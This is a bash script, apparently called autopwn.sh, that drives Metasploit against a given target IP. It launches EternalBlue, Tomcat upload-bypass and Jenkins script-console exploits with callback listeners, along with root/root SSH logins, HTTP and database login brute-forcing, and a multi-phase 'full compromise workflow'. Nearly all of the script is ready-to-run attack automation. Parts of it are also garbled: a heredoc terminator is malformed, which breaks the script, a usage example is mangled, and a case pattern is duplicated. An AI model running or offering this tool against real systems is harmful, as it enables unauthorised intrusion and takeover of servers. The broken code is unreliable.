#!/bin/bash
# Automated Exploitation Wrapper
# Runs common exploits against targets using Metasploit RC files

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RESOURCE_DIR="${SCRIPT_DIR}/resource"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════╗
║         AUTOMATED EXPLOITATION                          ║
║         Metasploit Resource Automation               ║
╚════════════════════════════════════════════════════════╝
EOF═══
    echo -e "${NC}"
}

# Scan and identify services
scan_target() {
    local target="$1"
    
    echo -e "${BLUE}[*] Scanning target: $target${NC}"
    
    # Quick nmap scan
    nmap -sV --script=vuln -oN "${target}-scan.nmap" "$target" 2>/dev/null || \
    nmap -sV -oN "${target}-scan.nmap" "$target"
    
    echo -e "${GREEN}[+] Scan results saved to: ${target}-scan.nmap${NC}"
}

# Exploit EternalBlue (MS17-010)
exploit_eternalblue() {
    local target="$1"
    
    echo -e "${YELLOW}[*] Exploiting MS17-010 (EternalBlue)${NC}"
    
    if [[ -f "${RESOURCE_DIR}/445-smb.rc" ]]; then
        sed "s|RHOST|$target|g" "${RESOURCE_DIR}/445-smb.rc" > /tmp/eternalblue.rc
        msfconsole -r /tmp/eternalblue.rc -q
        rm -f /tmp/eternalblue.rc
    else
        msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $target; set LHOST $(get_local_ip); run"
    fi
}

# Exploit SSH
exploit_ssh() {
    local target="$1"
    
    echo -e "${BLUE}[*] Testing SSH exploits${NC}"
    
    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $target; set USERNAME root; set PASSWORD root; run; exit"
}

# Exploit Tomcat
exploit_tomcat() {
    local target="$1"
    local port="${2:-8080}"
    
    echo -e "${BLUE}[*] Testing Apache Tomcat exploits${NC}"
    
    msfconsole -q -x "use exploit/multi/http/tomcat_jsp_upload_bypass; set RHOST $target; set RPORT $port; set LHOST $(get_local_ip); run; exit"
}

# Exploit Jenkins
exploit_jenkins() {
    local target="$1"
    local port="${2:-8080}"
    
    echo -e "${BLUE}[*] Testing Jenkins exploits${NC}"
    
    msfconsole -q -x "use exploit/multi/http/jenkins_script_console; set RHOST $target; set RPORT $port; set LHOST $(get_local_ip); run; exit"
}

# Web attacks
web_attack() {
    local target="$1"
    local port="${2:-80}"
    
    echo -e "${BLUE}[*] Running web attacks on $target:$port${NC}"
    
    # Title scan
    msfconsole -q -x "use auxiliary/scanner/http/title; set RHOSTS $target; set RPORT $port; run; exit"
    
    # Dir scanner
    msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $target; set RPORT $port; run; exit"
    
    # Login brute
    msfconsole -q -x "use auxiliary/scanner/http/http_login; set RHOSTS $target; set RPORT $port; run; exit"
}

# Database attacks
db_attack() {
    local target="$1"
    local type="$2"
    
    echo -e "${BLUE}[*] Testing $type database${NC}"
    
    case "$type" in
        mssql)
            msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $target; run; exit"
            ;;
        mysql)
            msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS $target; run; exit"
            ;;
        postgres)
            msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; set RHOSTS $target; run; exit"
            ;;
        oracle)
            msfconsole -q -x "use auxiliary/scanner/oracle/sid_brute; set RHOSTS $target; run; exit"
            ;;
    esac
}

# Full compromise workflow
full_compromise() {
    local target="$1"
    
    echo -e "${RED}[*] FULL COMPROMISE WORKFLOW${NC}"
    echo -e "${RED}[*] Target: $target${NC}"
    echo ""
    
    # Phase 1: Scan
    scan_target "$target"
    
    # Phase 2: Check common vulns
    echo -e "${YELLOW}[*] Phase 2: Checking common vulnerabilities${NC}"
    msfconsole -q -x "
        setg RHOST $target
        use auxiliary/scanner/smb/smb_ms17_010
        run
        use auxiliary/scanner/ssh/ssh_version
        run
        use auxiliary/scanner/http/http_version
        run
        exit
    "
    
    # Phase 3: Web attacks
    echo -e "${YELLOW}[*] Phase 3: Web enumeration${NC}"
    web_attack "$target" 80
    web_attack "$target" 443
    web_attack "$target" 8080
    web_attack "$target" 8443
    
    # Phase 4: Database enumeration
    echo -e "${YELLOW}[*] Phase 4: Database enumeration${NC}"
    db_attack "$target" mssql
    db_attack "$target" mysql
    db_attack "$target" postgres
    
    echo -e "${GREEN}[+] Full compromise workflow complete${NC}"
}

# Get local IP
get_local_ip() {
    ip route get 1 2>/dev/null | awk '{print $7; exit}' || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "10.10.10.10"
}

# List available modules
list_modules() {
    echo -e "${CYAN}Available Exploitation Modules:${NC}"
    echo ""
    echo "SMB:"
    echo "  eternalblue    - MS17-010 EternalBlue"
    echo "  smb-scan       - SMB vulnerability scanner"
    echo ""
    echo "SSH:"
    echo "  ssh            - SSH login scanner"
    echo ""
    echo "Web:"
    echo "  tomcat         - Apache Tomcat exploits"
    echo "  jenkins        - Jenkins script console"
    echo "  web            - General web attacks"
    echo ""
    echo "Database:"
    echo "  mssql          - MS SQL Server"
    echo "  mysql          - MySQL/MariaDB"
    echo "  postgres       - PostgreSQL"
    echo "  oracle         - Oracle"
    echo ""
    echo "Workflows:"
    echo "  full           - Full compromise workflow"
}

# Show usage
usage() {
    cat << 'EOF'
USAGE:
    ./autopwn.sh [OPTIONS]

OPTIONS:
    -t, --target IP       Target IP address
    -m, --module MODULE   Exploitation module
    -p, --port PORT       Target port
    -s, --scan            Run quick scan
    -f, --full            Full compromise workflow
    -l, --list            List available modules
    --msf-rc RC_FILE      Custom Metasploit RC file
    -h, --help            Show this help

MODULES:
    eternalblue     - MS17-010 (SMB)
    ssh             - SSH login
    tomcat          - Apache Tomcat
    jenkins         - Jenkins
    web             - General web
    mssql           - MS SQL Server
    mysql           - MySQL
    postgres        - PostgreSQL
    oracle          - Oracle
    full            - Full compromise

EXAMPLES:
    # Quick scan
    ./autopwn.sh --scan 192.168.1.1

    # Exploit Eternalautopwn.shBlue
    ./ -t 192.168.1.1 -m eternalblue

    # Full compromise
    ./autopwn.sh -t 10.10.10.1 -f

    # Web attacks on port 8080
    ./autopwn.sh -t 10.10.10.5 -m web -p 8080

    # Database attack
    ./autopwn.sh -t 192.168.1.100 -m mssql

EOF
}

main() {
    local target=""
    local module=""
    local port=""
    local action="menu"
    local rcf=""
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target) target="$2"; shift ;;
            -m|--module) module="$2"; shift ;;
            -p|--port) port="$2"; shift ;;
            -s|--scan) action="scan" ;;
            -f|--full) action="full" ;;
            -l|--list) action="list" ;;
            --msf-rc) rcf="$2"; shift ;;
            -h|--help) action="help" ;;
            *) target="$1" ;;
        esac
        shift
    done
    
    banner
    
    if [[ -z "$target" && "$action" != "list" && "$action" != "help" ]]; then
        echo -e "${RED}[!] Target required${NC}"
        usage
        exit 1
    fi
    
    case "$action" in
        scan)
            scan_target "$target"
            ;;
        full)
            full_compromise "$target"
            ;;
        list)
            list_modules
            ;;
        help)
            usage
            ;;
        *)
            if [[ -n "$module" ]]; then
                case "$module" in
                    eternalblue)
                        exploit_eternalblue "$target"
                        ;;
                    ssh)
                        exploit_ssh "$target"
                        ;;
                    tomcat)
                        exploit_tomcat "$target" "${port:-8080}"
                        ;;
                    jenkins)
                        exploit_jenkins "$target" "${port:-8080}"
                        ;;
                    web)
                        web_attack "$target" "${port:-80}"
                        ;;
                    mssql|mssql)
                        db_attack "$target" mssql
                        ;;
                    mysql)
                        db_attack "$target" mysql
                        ;;
                    postgres)
                        db_attack "$target" postgres
                        ;;
                    oracle)
                        db_attack "$target" oracle
                        ;;
                    *)
                        echo -e "${RED}[!] Unknown module: $module${NC}"
                        list_modules
                        ;;
                esac
            else
                usage
            fi
            ;;
    esac
}

main "$@"
